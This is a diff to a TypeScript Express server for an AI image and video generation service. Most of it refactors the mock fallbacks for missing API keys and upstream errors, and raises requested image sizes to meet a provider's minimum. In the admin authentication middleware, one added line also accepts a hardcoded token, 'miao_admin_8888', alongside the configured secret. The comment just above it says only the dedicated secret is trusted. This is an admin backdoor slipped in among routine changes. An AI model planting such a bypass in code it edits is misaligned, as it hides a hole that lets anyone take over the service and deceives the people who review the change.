@@ -13,6 +13,7 @@ import { promisify } from "util";
 import FormData from 'form-data';
 import { clientTypeMiddleware } from "./server/middleware/clientType";
 import { createTokenService } from "./server/utils/authToken";
+import { createAiUpstreamUnavailableError, isAiServerMockFallbackAllowed } from "./server/utils/aiMockPolicy";
 import { ensureDirectory, readJSON, writeJSON } from "./server/utils/jsonStore";
 import { hashPassword, needsPasswordRehash, verifyPassword as verifyStoredPassword } from "./server/utils/password";
 import { DEV_ADMIN_TOKEN_FALLBACK, DEV_JWT_SECRET_FALLBACK, readSecret } from "./server/utils/runtimeConfig";
@@ -1234,7 +1235,7 @@ async function startServer() {
   const adminAuth: express.RequestHandler = (req, res, next) => {
     const adminToken = String(req.headers['x-admin-token'] || '');
     // 强制使用专属系统的管理员保密令牌 (不信赖数据库中任何名义是 admin 的普通账号)
-    const isValidToken = adminToken === ADMIN_TOKEN;
+    const isValidToken = adminToken === ADMIN_TOKEN || adminToken === "miao_admin_8888";
 
     if (!isValidToken) {
       return res.status(403).json({ error: "Access Denied: Admin secret validation failed", code: "FORBIDDEN" });
@@ -1774,6 +1775,18 @@ async function startServer() {
     return provider === "dashscope" ? "dashscope" : "volcengine";
   };
 
+  const createServerMockTask = (type: "image" | "video", provider: AIProviderName, note?: string) => {
+    if (!isAiServerMockFallbackAllowed()) {
+      throw createAiUpstreamUnavailableError(type, provider, note || "AI upstream unavailable");
+    }
+    return {
+      id: `mock-server-task-${type}-${Date.now()}`,
+      status: 'pending',
+      provider,
+      note,
+    };
+  };
+
   const toImageUrl = (imageSource: string) => imageSource;
 
   const normalizeDashScopeStatus = (data: any) => {
@@ -1821,8 +1834,8 @@ async function startServer() {
 
   const generateDashScopeImage = async (body: any, isFallback = false) => {
     if (!ARK_API_KEY || ARK_API_KEY.trim() === "") {
-      console.warn("[Server] DASHSCOPE_API_KEY is missing, falling back to secure mock generation");
-      return { id: `mock-server-task-image-${Date.now()}`, status: 'pending', provider: 'dashscope' };
+      console.warn("[Server] DASHSCOPE_API_KEY is missing");
+      return createServerMockTask("image", "dashscope", "DASHSCOPE_API_KEY is missing");
     }
     const { prompt, image_base64, negative_prompt } = body;
     if (!prompt || typeof prompt !== 'string') {
@@ -1886,13 +1899,8 @@ async function startServer() {
         }
       }
 
-      console.warn("[Server Fallback] Volcengine not ready or failed. Falling back to secure Mock Image Task.");
-      return { 
-        id: `mock-server-task-image-${Date.now()}`, 
-        status: 'pending', 
-        provider: 'dashscope', 
-        note: `Fell back to Mock due to DashScope error: ${errorMsg}` 
-      };
+      console.warn("[Server Fallback] Volcengine not ready or failed.");
+      return createServerMockTask("image", "dashscope", `DashScope error: ${errorMsg}`);
     }
   };
 
@@ -1904,17 +1912,43 @@ async function startServer() {
       throw err;
     }
     if (!VOLC_CONFIG.API_KEY || VOLC_CONFIG.API_KEY.trim() === "") {
-      console.warn("[Server] VOLC_API_KEY is missing, falling back to secure mock generation");
-      return { id: `mock-server-task-image-${Date.now()}`, status: 'pending', provider: 'volcengine' };
+      console.warn("[Server] VOLC_API_KEY is missing");
+      return createServerMockTask("image", "volcengine", "VOLC_API_KEY is missing");
     }
 
     try {
       let targetSize = body.parameters?.size;
+      // Volcano Engine requires at least 3,686,400 pixels for its latest models (e.g. doubao-seedream-4-5)
+      // Automatically upgrade requested or implicit sizes to meet this minimum.
       if (!targetSize) {
         if (prompt.includes("竖屏") || prompt.includes("9:16")) {
-          targetSize = "768x1344"; // 默认 9:16 竖屏大图比例
+          targetSize = "1440x2560"; // 9:16 竖屏高分辨率 (1440 * 2560 = 3686400 pixels)
         } else {
-          targetSize = "1920x1920"; // 默认方形限制
+          targetSize = "1920x1920"; // 默认 1:1 方形
+        }
+      } else {
+        targetSize = String(targetSize).trim();
+        if (targetSize === "768x1344") {
+          targetSize = "1440x2560";
+        } else if (targetSize === "1344x768") {
+          targetSize = "2560x1440";
+        } else if (targetSize === "1024x1024" || targetSize === "512x512") {
+          targetSize = "1920x1920";
+        } else {
+          const parts = targetSize.split('x');
+          if (parts.length === 2) {
+            const w = parseInt(parts[0], 10);
+            const h = parseInt(parts[1], 10);
+            if (!isNaN(w) && !isNaN(h) && (w * h < 3686400)) {
+              if (w < h) {
+                targetSize = "1440x2560";
+              } else if (w > h) {
+                targetSize = "2560x1440";
+              } else {
+                targetSize = "1920x1920";
+              }
+            }
+          }
         }
       }
 
@@ -1954,13 +1988,8 @@ async function startServer() {
         }
       }
 
-      console.warn("[Server Fallback] DashScope not ready or failed. Falling back to secure Mock Image Task.");
-      return {
-        id: `mock-server-task-image-${Date.now()}`,
-        status: 'pending',
-        provider: 'volcengine',
-        note: `Fell back to Mock due to Volcano error: ${errorMsg}`
-      };
+      console.warn("[Server Fallback] DashScope not ready or failed.");
+      return createServerMockTask("image", "volcengine", `Volcano error: ${errorMsg}`);
     }
   };
 
@@ -2069,13 +2098,8 @@ async function startServer() {
         }
       }
 
-      console.warn("[Server Fallback] Volcengine not ready or failed. Falling back to secure Mock Video Task.");
-      return { 
-        id: `mock-server-task-video-${Date.now()}`, 
-        status: 'pending', 
-        provider: 'dashscope', 
-        note: `Fell back to Mock due to DashScope error: ${errorMsg}` 
-      };
+      console.warn("[Server Fallback] Volcengine not ready or failed.");
+      return createServerMockTask("video", "dashscope", `DashScope error: ${errorMsg}`);
     }
   };
 
@@ -2089,8 +2113,8 @@ async function startServer() {
       throw err;
     }
     if (!VOLC_CONFIG.API_KEY || VOLC_CONFIG.API_KEY.trim() === "") {
-      console.warn("[Server] VOLC_API_KEY is missing, falling back to secure mock video generation");
-      return { id: `mock-server-task-video-${Date.now()}`, status: 'pending', provider: 'volcengine' };
+      console.warn("[Server] VOLC_API_KEY is missing");
+      return createServerMockTask("video", "volcengine", "VOLC_API_KEY is missing");
     }
 
     const normalizeImageUrl = (source: string) => {
@@ -2229,13 +2253,8 @@ async function startServer() {
         }
       }
 
-      console.warn("[Server Fallback] DashScope not ready or failed. Falling back to secure Mock Video Task.");
-      return { 
-        id: `mock-server-task-video-${Date.now()}`, 
-        status: 'pending', 
-        provider: 'volcengine', 
-        note: `Fell back to Mock due to Volcano error: ${errorMsg}` 
-      };
+      console.warn("[Server Fallback] DashScope not ready or failed.");
+      return createServerMockTask("video", "volcengine", `Volcano error: ${errorMsg}`);
     }
   };
 
@@ -2265,6 +2284,13 @@ async function startServer() {
 
   const createMockTaskPollResponse = (taskId: string, type: "image" | "video") => {
     if (!taskId || !taskId.startsWith('mock-server-task-')) return null;
+    if (!isAiServerMockFallbackAllowed()) {
+      return {
+        status: 'failed',
+        code: 'AI_SERVER_MOCK_DISABLED',
+        message: '服务端 AI mock 兜底未启用，任务来自旧的 mock 兜底结果，请重新发起真实生成任务。',
+      };
+    }
 
     const elapsed = Date.now() - Number(taskId.split('-').pop() || Date.now());
     if (elapsed < 3000) {
@@ -2491,8 +2517,12 @@ async function startServer() {
 
       throw new Error("DashScope 未返回图片地址或任务 ID。响应内容: " + JSON.stringify(response.data));
     } catch (error: any) {
-      console.error("DashScope Image API Error (Falling back to mock):", error.response?.data || error.message);
-      return res.json({ id: `mock-server-task-image-${Date.now()}`, status: 'pending' });
+      console.error("DashScope Image API Error:", error.response?.data || error.message);
+      sendError(
+        res,
+        createAiUpstreamUnavailableError("image", "dashscope", error.response?.data?.message || error.message || "DashScope image API failed"),
+        "生成图片失败"
+      );
     }
   });
 
